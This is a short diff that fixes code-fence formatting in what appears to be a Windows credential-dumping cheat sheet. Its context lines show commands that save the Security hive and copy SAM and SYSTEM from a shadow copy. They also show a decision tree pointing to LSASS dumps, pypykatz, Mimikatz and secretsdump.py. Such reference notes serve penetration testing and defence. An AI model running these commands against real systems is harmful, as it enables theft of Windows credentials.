@@ -38,6 +38,7 @@ reg save HKLM\Security C:\temp\SAM
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
 ```
+```
 │
 ├── Have local admin on target?
 │   ├── LSASS dump (§1)
@@ -64,5 +65,4 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYS
 └── Offline dump file (.dmp)?
     ├── LSASS dump → pypykatz / Mimikatz offline (§1)
     └── SAM+SYSTEM → secretsdump.py LOCAL (§2)
-
-    ```
+```
